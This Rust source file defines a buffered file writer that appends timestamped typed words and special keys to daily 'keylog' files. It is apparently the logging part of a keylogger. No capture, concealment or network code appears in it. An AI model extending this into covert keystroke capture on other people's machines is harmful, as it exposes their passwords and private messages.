use chrono::prelude::*;
use std::fs::{self, OpenOptions};
use std::io::{Result, Write};
use std::path::Path;

pub struct FileWriter {
    file: fs::File,
    buffer: Vec<String>,
    buffer_size: usize,
}

impl FileWriter {
    pub fn new() -> Result<Self> {
        if !Path::new("logs").exists() {
            fs::create_dir("logs")?;
        }

        let date = Local::now().format("%Y-%m-%d").to_string();
        let file_path = format!("logs/keylog_{}.txt", date);

        let file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(file_path)?;

        Ok(Self {
            file,
            buffer: Vec::new(),
            buffer_size: 10,
        })
    }

    pub fn log_word(&mut self, word: &str) -> Result<()> {
        let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let log_entry = format!("[{}] Word: {}\n", timestamp, word);
        self.buffer.push(log_entry);
        if self.buffer.len() >= self.buffer_size {
            self.flush_buffer()?;
        }
        Ok(())
    }

    pub fn log_special_key(&mut self, special_key: &str) -> Result<()> {
        let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let log_entry = format!("[{}] Special: {}\n", timestamp, special_key);
        self.buffer.push(log_entry);
        if self.buffer.len() >= self.buffer_size {
            self.flush_buffer()?;
        }
        Ok(())
    }

    fn flush_buffer(&mut self) -> Result<()> {
        for entry in &self.buffer {
            self.file.write_all(entry.as_bytes())?;
        }
        self.file.flush()?;
        self.buffer.clear();
        Ok(())
    }

    pub fn finalize(&mut self) -> Result<()> {
        if !self.buffer.is_empty() {
            self.flush_buffer()?;
        }
        Ok(())
    }
}

impl Drop for FileWriter {
    fn drop(&mut self) {
        let _ = self.finalize();
    }
}
